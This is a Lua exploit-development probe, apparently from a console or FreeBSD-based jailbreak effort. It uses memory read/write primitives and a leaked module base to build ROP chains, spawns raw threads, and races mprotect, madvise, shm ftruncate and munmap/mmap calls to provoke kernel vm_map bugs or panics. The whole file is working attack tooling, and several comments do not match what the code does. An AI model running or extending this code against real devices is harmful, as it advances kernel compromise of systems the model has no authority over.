-- CRASH_CLASS: HIGH
-- PROBE 93d2: vm_map races with dual native-speed children
--
-- Two ROP children racing on vm_map operations at full native speed.
-- A) mmap/munmap same region (vm_map_entry manipulation)
-- B) mprotect race on shared mapping (page table race)
-- C) madvise(MADV_DONTNEED) + read race (page fault race)
-- D) ftruncate + mmap on same shm object (object resize race)

print("=== PROBE 93d2: VM RACE DEEP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)
local prc_lo, prc_hi = eoff(0xE64)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)

    for _, c in ipairs(calls) do
        local a1_lo, a1_hi = split(c[2] or 0)
        local a2_lo, a2_hi = split(c[3] or 0)
        local a3_lo, a3_hi = split(c[4] or 0)
        local a4_lo, a4_hi = split(c[5] or 0)
        local a5_lo, a5_hi = split(c[6] or 0)
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(prc_lo, prc_hi); put(a4_lo, a4_hi)
        put(pr8_lo, pr8_hi); put(a5_lo, a5_hi)
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end

    put(par_lo, par_hi); put(0xDEAD93D2, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(da, max)
    for w = 1, (max or 50000) do
        local df = rd(da)
        if df and df ~= 0 then return true end
    end
    return false
end

-- ========== SECTION A: mprotect race on shared mapping ==========
print("--- A: mprotect race (two children toggling prot) ---")
local RACES = 50
local a_crashes = 0

for race = 1, RACES do
    -- Shared anon mapping
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m then break end
    local addr = N(rv_m)
    if addr == 0 then break end
    local addr_lo, addr_hi = split(addr)

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: mprotect(addr, 0x4000, PROT_READ) x 100
    local c1 = {}
    for i = 1, 100 do c1[#c1 + 1] = {74, addr, 0x4000, 1, 0, 0} end

    -- Child 2: mprotect(addr, 0x4000, PROT_READ|PROT_WRITE) x 100
    local c2 = {}
    for i = 1, 100 do c2[#c2 + 1] = {74, addr, 0x4000, 3, 0, 0} end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    -- Check if mapping survived
    local v = rd(addr)
    if v == nil then a_crashes = a_crashes + 1 end

    pcall(function() mk(73)(uint64(addr), uint64(0x4000)) end)
    if not alive() then a_crashes = a_crashes + 1; break end
end
print(string.format("mprotect_race: %d races, %d anomalies", RACES, a_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION B: madvise(MADV_FREE) + write race ==========
print("")
print("--- B: madvise(MADV_FREE=5) + write race ---")
local b_crashes = 0

for race = 1, RACES do
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m then break end
    local addr = N(rv_m)
    if addr == 0 then break end

    -- Write initial data
    wd(addr, 0xBEEF0000 + race)

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: madvise(addr, 0x4000, MADV_FREE=5) x 100
    local c1 = {}
    for i = 1, 100 do c1[#c1 + 1] = {75, addr, 0x4000, 5, 0, 0} end

    -- Child 2: write pattern to addr via a gadget chain that stores rax to [rdi]
    -- mov [rdi], rax; ret with rdi=addr, rax=marker x 100
    local c2 = {}
    for i = 1, 100 do
        -- Use sysctl(202) as a dummy that touches the mapping
        -- Actually: write via mprotect which is a VM operation
        c2[#c2 + 1] = {74, addr, 0x4000, 3, 0, 0}
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    -- Read back - should be zero if MADV_FREE won
    local v = rd(addr)
    if v == nil then
        b_crashes = b_crashes + 1
    end

    pcall(function() mk(73)(uint64(addr), uint64(0x4000)) end)
    if not alive() then b_crashes = b_crashes + 1; break end
end
print(string.format("madvise_race: %d races, %d anomalies", RACES, b_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION C: ftruncate + mmap on shm object ==========
print("")
print("--- C: shm ftruncate + mmap race ---")
local c_crashes = 0

for race = 1, RACES do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(0x202), uint64(0x1FF))
    end)
    if not ok_s then break end
    local shm_fd = N(rv_s)
    if shm_fd < 0 then break end

    -- Initial size: 16KB
    pcall(function() mk(480)(uint64(shm_fd), uint64(0x4000)) end)

    -- mmap it
    local ok_mm, rv_mm = pcall(function()
        return mk(477)(uint64(0), uint64(0x10000), uint64(3),
            uint64(1), uint64(shm_fd), uint64(0))
    end)
    local shm_addr = ok_mm and N(rv_mm) or 0

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: ftruncate between 16KB and 64KB x 100
    local c1 = {}
    for i = 1, 50 do
        c1[#c1 + 1] = {480, shm_fd, 0x10000, 0, 0, 0}  -- 64KB
        c1[#c1 + 1] = {480, shm_fd, 0x4000, 0, 0, 0}   -- 16KB
    end

    -- Child 2: try reading past the smaller size boundary
    -- Use mprotect as a VM operation that touches the vm_map
    local c2 = {}
    if shm_addr > 0 then
        for i = 1, 100 do
            c2[#c2 + 1] = {74, shm_addr, 0x10000, 3, 0, 0}
        end
    else
        for i = 1, 100 do c2[#c2 + 1] = {20, 0, 0, 0, 0, 0} end
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if shm_addr > 0 then pcall(function() mk(73)(uint64(shm_addr), uint64(0x10000)) end) end
    pcall(function() mk(6)(uint64(shm_fd)) end)

    if not alive() then c_crashes = c_crashes + 1; break end
end
print(string.format("shm_ftruncate_race: %d races, %d anomalies", RACES, c_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION D: munmap + concurrent page fault ==========
print("")
print("--- D: munmap + write fault race ---")
local d_crashes = 0

-- This is the most dangerous: child1 faults on addr while child2 unmaps it
-- A genuine vm_map race could cause a kernel panic
for race = 1, 30 do
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_m then break end
    local addr = N(rv_m)
    if addr == 0 then break end

    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: mprotect(addr, 0x4000, RW) x 80 (touches vm_map, may fault)
    local c1 = {}
    for i = 1, 80 do
        c1[#c1 + 1] = {74, addr, 0x4000, 3, 0, 0}
    end

    -- Child 2: unmap then remap x 40
    local c2 = {}
    for i = 1, 40 do
        c2[#c2 + 1] = {73, addr, 0x4000, 0, 0, 0}  -- munmap
        c2[#c2 + 1] = {477, addr, 0x4000, 3, 0x1012, 0xFFFFFFFF}  -- mmap MAP_FIXED
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    pcall(function() mk(73)(uint64(addr), uint64(0x4000)) end)
    if not alive() then d_crashes = d_crashes + 1; break end
end
print(string.format("munmap_fault_race: %d races, %d anomalies", 30, d_crashes))

print("")
local total = a_crashes + b_crashes + c_crashes + d_crashes
print(string.format("TOTAL ANOMALIES: %d", total))
print("alive=" .. tostring(alive()))
print("=== 93d2 COMPLETE ===")
